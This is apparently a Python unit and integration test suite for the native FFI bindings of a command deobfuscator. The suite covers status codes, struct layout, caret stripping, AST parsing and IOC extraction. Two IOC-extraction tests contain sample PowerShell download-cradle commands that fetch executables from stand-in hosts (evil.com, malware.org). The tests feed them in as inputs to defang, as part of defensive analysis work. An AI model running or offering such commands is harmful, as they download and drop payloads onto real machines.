"""
Comprehensive Unit & Integration Test Suite for C/Rust FFI Bindings & Native Acceleration Subsystem.
"""

import ctypes
import json
import os
import subprocess
import sys
import tempfile
import unittest

from src.ffi.models import (
    FFIStatusCode,
    FFIFlags,
    FFIOptions,
    FFIMetrics,
    FFIResult,
    FFIContext,
    compute_entropy,
    zeroize_buffer,
)
from src.ffi.c_api import (
    CCmdFFIOptions,
    CCmdFFIMetrics,
    find_cdylib_path,
    init_native_library,
)
from src.ffi.bridge import CmdDeobfuscatorBridge
from src.ffi.standalone import (
    export_c_header,
    verify_roundtrip,
    build_native_library,
)


class TestFFIModels(unittest.TestCase):
    """Tests for FFI data models, enums, metrics, and memory security."""

    def test_status_codes(self):
        self.assertEqual(int(FFIStatusCode.OK), 0)
        self.assertEqual(int(FFIStatusCode.ERR_NULL_POINTER), -1)
        self.assertEqual(int(FFIStatusCode.ERR_INVALID_UTF8), -2)
        self.assertEqual(int(FFIStatusCode.ERR_BUFFER_OVERFLOW), -3)
        self.assertEqual(int(FFIStatusCode.ERR_EXECUTION_FAILED), -4)
        self.assertEqual(int(FFIStatusCode.ERR_INVALID_STATE), -5)
        self.assertEqual(int(FFIStatusCode.ERR_TIMEOUT), -6)

    def test_flags_bitwise_operations(self):
        flags = FFIFlags.STRIP_CARETS | FFIFlags.FOLD_CONSTANTS | FFIFlags.DCE
        self.assertTrue(flags & FFIFlags.STRIP_CARETS)
        self.assertTrue(flags & FFIFlags.FOLD_CONSTANTS)
        self.assertTrue(flags & FFIFlags.DCE)
        self.assertFalse(flags & FFIFlags.FAST_PATH)
        self.assertEqual(int(FFIFlags.ALL_OPTIMIZATIONS), 0x3F)

    def test_options_defaults_and_dict(self):
        opts = FFIOptions()
        self.assertEqual(opts.flags, FFIFlags.ALL_OPTIMIZATIONS)
        self.assertEqual(opts.max_passes, 10)
        d = opts.to_dict()
        self.assertEqual(d["max_passes"], 10)
        self.assertEqual(d["timeout_ms"], 5000)

    def test_metrics_telemetry(self):
        m = FFIMetrics(
            elapsed_ns=1_500_000,
            ast_nodes_initial=10,
            ast_nodes_final=6,
            passes_executed=3,
            iocs_extracted=2,
            entropy_initial=5.12345,
            entropy_final=4.12345,
        )
        d = m.to_dict()
        self.assertEqual(d["elapsed_ms"], 1.5)
        self.assertEqual(d["ast_nodes_initial"], 10)
        self.assertEqual(d["ast_nodes_final"], 6)
        self.assertEqual(d["entropy_initial"], 5.1235)
        self.assertEqual(d["entropy_final"], 4.1235)

    def test_result_model(self):
        res = FFIResult(
            text="echo 1",
            length=6,
            status=FFIStatusCode.OK,
            error=None,
        )
        self.assertTrue(res.is_ok)
        d = res.to_dict()
        self.assertEqual(d["status"], 0)
        self.assertEqual(d["status_name"], "OK")
        self.assertEqual(d["length"], 6)

    def test_context_lifecycle(self):
        ctx = FFIContext(options=FFIOptions(max_passes=5), native_handle=123)
        self.assertTrue(ctx.is_active)
        self.assertEqual(ctx.native_handle, 123)
        ctx.close()
        self.assertFalse(ctx.is_active)
        self.assertIsNone(ctx.native_handle)

    def test_compute_entropy(self):
        self.assertEqual(compute_entropy(""), 0.0)
        self.assertEqual(compute_entropy("AAAAAA"), 0.0)
        self.assertGreater(compute_entropy("abcdefgh12345678"), 3.5)

    def test_zeroize_buffer_security(self):
        # bytearray
        b = bytearray(b"SECRET_KEY_9999")
        zeroize_buffer(b)
        self.assertTrue(all(x == 0 for x in b))

        # ctypes array
        c_buf = (ctypes.c_uint8 * 16)(*([0xFF] * 16))
        zeroize_buffer(c_buf)
        self.assertTrue(all(x == 0 for x in c_buf))

        # None safety
        zeroize_buffer(None)


class TestCAPIBindings(unittest.TestCase):
    """Tests for ctypes binary structure packing and library loader."""

    def test_c_structures_layout(self):
        opts = CCmdFFIOptions(flags=1, max_passes=5, timeout_ms=1000, max_unroll_depth=20)
        self.assertEqual(ctypes.sizeof(opts), 16)  # 4 * 4 bytes
        self.assertEqual(opts.flags, 1)
        self.assertEqual(opts.max_passes, 5)

        metrics = CCmdFFIMetrics(
            elapsed_ns=1000,
            ast_nodes_initial=4,
            ast_nodes_final=2,
            passes_executed=1,
            iocs_extracted=0,
            entropy_initial=3.5,
            entropy_final=2.5,
        )
        self.assertEqual(ctypes.sizeof(metrics), 40)
        self.assertEqual(metrics.elapsed_ns, 1000)

    def test_cdylib_discovery_and_binding(self):
        lib_path = find_cdylib_path()
        if lib_path:
            lib, resolved = init_native_library(lib_path)
            self.assertIsNotNone(lib)
            self.assertEqual(resolved, lib_path)
            ver = lib.cmd_ffi_version()
            self.assertEqual(ver.decode("utf-8"), "0.20.0")


class TestCmdDeobfuscatorBridge(unittest.TestCase):
    """Tests for unified FFI bridge (native and pure-Python modes)."""

    def setUp(self):
        self.native_bridge = CmdDeobfuscatorBridge(force_python=False)
        self.python_bridge = CmdDeobfuscatorBridge(force_python=True)

    def test_native_bridge_execution(self):
        if not self.native_bridge.is_native_accelerated:
            self.skipTest("Native cdylib not compiled, skipping native FFI test")

        sample = "c^m^d.e^x^e /c e^c^h^o h^e^l^l^o"
        res = self.native_bridge.deobfuscate(sample, flags=FFIFlags.STRIP_CARETS)
        self.assertTrue(res.is_ok)
        self.assertIn("cmd.exe", res.text)
        self.assertIn("echo hello", res.text)
        self.assertGreater(res.length, 0)
        self.assertGreaterEqual(res.metrics.passes_executed, 1)

    def test_native_ioc_extraction(self):
        if not self.native_bridge.is_native_accelerated:
            self.skipTest("Native cdylib not compiled, skipping native FFI test")

        sample = "powershell -c (New-Object Net.WebClient).DownloadFile('http://evil.com/drop.exe')"
        res = self.native_bridge.extract_iocs(sample, flags=FFIFlags.DEFANG_IOCS)
        self.assertTrue(res.is_ok)
        self.assertIn("hxxp://evil[.]com/drop[.]exe", res.text)
        self.assertGreaterEqual(res.metrics.iocs_extracted, 1)

    def test_native_parse_ast(self):
        if not self.native_bridge.is_native_accelerated:
            self.skipTest("Native cdylib not compiled, skipping native FFI test")

        sample = "@echo off\nset a=1\n:loop\ngoto loop"
        res = self.native_bridge.parse_ast(sample)
        self.assertTrue(res.is_ok)
        self.assertIn("ProgramNode", res.text)
        self.assertIn("AssignmentNode", res.text)

    def test_native_null_input_handling(self):
        res = self.native_bridge.deobfuscate(None)
        self.assertEqual(res.status, FFIStatusCode.ERR_NULL_POINTER)
        self.assertFalse(res.is_ok)

    def test_python_fallback_bridge_execution(self):
        sample = "c^m^d.e^x^e /c echo 1"
        res = self.python_bridge.deobfuscate(sample, flags=FFIFlags.STRIP_CARETS)
        self.assertTrue(res.is_ok)
        self.assertIn("cmd.exe", res.text)
        self.assertEqual(res.status, FFIStatusCode.OK)

    def test_python_fallback_ioc_extraction(self):
        sample = "powershell -c (New-Object Net.WebClient).DownloadFile('http://malware.org/x.exe')"
        res = self.python_bridge.extract_iocs(sample, flags=FFIFlags.DEFANG_IOCS)
        self.assertTrue(res.is_ok)
        parsed = json.loads(res.text)
        self.assertIsInstance(parsed, list)
        self.assertGreaterEqual(len(parsed), 1)

    def test_python_fallback_parse_ast(self):
        sample = "echo Hello World"
        res = self.python_bridge.parse_ast(sample)
        self.assertTrue(res.is_ok)
        parsed = json.loads(res.text)
        self.assertTrue("type" in parsed or "node_type" in parsed)

    def test_python_fallback_null_input_handling(self):
        res = self.python_bridge.deobfuscate(None)
        self.assertEqual(res.status, FFIStatusCode.ERR_NULL_POINTER)
        self.assertFalse(res.is_ok)

    def test_fast_path_routine(self):
        sample = "c^m^d.e^x^e"
        out = self.python_bridge.run_fast_path(sample)
        self.assertIn("cmd.exe", out)


class TestStandaloneAndCLI(unittest.TestCase):
    """Tests for header exporter, roundtrip verification, and CLI flags."""

    def test_export_c_header_default(self):
        path = export_c_header()
        self.assertTrue(os.path.isfile(path))
        with open(path, "r", encoding="utf-8") as f:
            content = f.read()
        self.assertIn("cmd_ffi_status_t", content)
        self.assertIn("cmd_ffi_deobfuscate", content)
        self.assertIn("cmd_ffi_zeroize", content)

    def test_export_c_header_custom_target(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            out_file = os.path.join(tmp_dir, "custom_export.h")
            res_path = export_c_header(out_file)
            self.assertEqual(res_path, os.path.abspath(out_file))
            self.assertTrue(os.path.isfile(out_file))

    def test_verify_roundtrip_report(self):
        report = verify_roundtrip()
        self.assertEqual(report["status"], "PASS")
        self.assertTrue(report["zeroize_verified"])
        self.assertEqual(report["version"], "0.20.0")
        self.assertIn("deobfuscation", report)
        self.assertIn("iocs", report)
        self.assertIn("ast", report)

    def test_verify_roundtrip_pure_python(self):
        report = verify_roundtrip(force_python=True)
        self.assertEqual(report["status"], "PASS")
        self.assertFalse(report["is_native_accelerated"])
        self.assertTrue(report["zeroize_verified"])

    def test_cli_flags_roundtrip(self):
        # 1. Test --ffi-export-header
        with tempfile.TemporaryDirectory() as tmp_dir:
            hdr_path = os.path.join(tmp_dir, "exported.h")
            proc1 = subprocess.run(
                [sys.executable, "-m", "src.cli", "--ffi-export-header", hdr_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False,
            )
            self.assertEqual(proc1.returncode, 0)
            self.assertTrue(os.path.isfile(hdr_path))

        # 2. Test --ffi-test-roundtrip
        proc2 = subprocess.run(
            [sys.executable, "-m", "src.cli", "--ffi-test-roundtrip"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        self.assertEqual(proc2.returncode, 0)
        data = json.loads(proc2.stdout)
        self.assertEqual(data["status"], "PASS")


if __name__ == "__main__":
    unittest.main()
